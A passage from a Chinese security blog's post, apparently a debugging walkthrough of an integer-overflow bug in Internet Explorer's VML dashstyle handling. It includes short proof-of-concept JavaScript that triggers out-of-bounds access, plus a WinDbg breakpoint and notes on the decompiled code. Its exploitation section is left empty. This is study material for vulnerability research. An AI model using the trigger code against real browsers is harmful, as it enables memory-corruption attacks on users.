+<p>crashme()将a数组元素设置为之前创建的v:shape数组的RuntimeStyle，最后设置vml1的dashstyle长度为44即0x2C</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i] = <span class="built_in">document</span>.getElementById(<span class="string">&quot;rect&quot;</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i].rotation;                                                   <span class="comment">//create a COARuntimeStyle</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;                                                <span class="comment">//allocate an ORG array of size 0x2c</span></span><br><span class="line">		vml1.dashstyle = <span class="string">&quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后 dashstyle 数组长度被置为-1，显然造成了整数溢出漏洞，导致调用get_item()引发数组越界访问，触发漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br><span class="line">shape.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>存在整数溢出的函数一定与dashstyle有关，在Functions window搜索dashstyle，找到最可疑的函数，windbg下断点</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bp vgx!COALineDashStyleArray::put_length</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://i.loli.net/2021/08/18/z86itLpGTKeECno.png" style="zoom:80%;" />
+
+<p>命中断点后单步运行，程序调用CElements获取DashStyleArray对象的长度，返回值eax=2c，正是poc中vml1.dashstyle数组长度，保存在this指针里</p>
+<img src="https://i.loli.net/2021/08/18/sfKSp6F2qJMRvXL.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/O9ufwMzdBmeog3b.png" style="zoom:80%;" />
+
+<p>接着获取第二个参数FFFF即-1，计划将数组长度设置为目标长度-1。如果当前长度0x2c大于目标长度-1，则调用DeleteRange将多余的元素删除，使得数组长度等于目标长度</p>
+<img src="https://i.loli.net/2021/08/18/Rp38OqA7L5XzHca.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/sgnJj1QSV5N6T4z.png" style="zoom:80%;" />
+
+<p>对应的 IDA 反编译代码位于COALineDashStyleArray::put_length()</p>
+<img src="https://i.loli.net/2021/08/18/1xori9kKzbgduwF.png" style="zoom:80%;" />
+
+<p>依次跟进DeleteRange()、MsoDeletePx()、MsoFRemovePx()，这三个函数的参数都相同，第一个this指针，第二个目标长度，第三个是需要删除的范围，即当前长度减目标长度</p>
+<img src="https://i.loli.net/2021/08/18/AGvIckwuhyn35WJ.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/oI2EzTcYyOtfZWD.png" style="zoom:80%;" />
+
+<p>导致漏洞的位置在MsoFRemovePx()。进行调试，程序首先获取this指针</p>
+<img src="https://i.loli.net/2021/08/18/oulzL2SWmvbAkhR.png" style="zoom:80%;" />
+
+<p>获取数组每个单位的长度，这里是int，4个字节</p>
+<img src="https://i.loli.net/2021/08/18/8ewyScdYNt1JPzW.png" style="zoom:80%;" />
+
+<p>[esi+0Ch]为数组首地址，数组首地址+目标长度*每个单位长度 = 数组需要删除的部分首地址</p>
+<img src="https://i.loli.net/2021/08/18/yuJFL7afo8gqBlm.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/WMvbp76e8NSyYwF.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/le7OFNoAxISd6hU.png" style="zoom:80%;" />
+
+<p>对应c语言代码，v5 = 数组需要删除的部分首地址，主要执行了第10行和第11行两条语句，接下来跳过if语句</p>
+<img src="https://i.loli.net/2021/08/18/cQgIFMVzEYk2O6p.png" style="zoom:80%;" />
+
+<p>然后动态调试的部分c语言代码：</p>
+<img src="https://i.loli.net/2021/08/18/dHbiUOwqhLlk3EA.png" style="zoom:80%;" />
+
+<p>这个if语句也不满足，跳转指向更新数组长度的语句，更新前vftable中保存的长度为2c，更新后长度为ffff，易造成数组访问越界</p>
+<img src="https://i.loli.net/2021/08/18/4Po6SZKxdQjkqyH.png" style="zoom:80%;" />
+
+
+
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1. 利用条件"></a>1. 利用条件</h3><h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
+<li>《漏洞战争》</li>
+</ul>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>整数溢出</tag>
       </tags>
   </entry>
 </search>
